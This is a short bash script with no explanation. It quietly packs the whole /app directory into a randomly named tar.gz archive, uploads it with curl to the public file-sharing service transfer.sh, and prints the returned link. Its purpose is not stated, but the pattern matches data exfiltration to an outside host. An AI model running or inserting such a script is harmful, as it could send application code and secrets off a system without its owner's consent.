#!/bin/bash
tar -zcvf `cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-5} | head -n 1`.tar.gz /app > /dev/null 2>&1
curl --upload-file *.tar.gz https://transfer.sh/ >> response.json
cat response.json
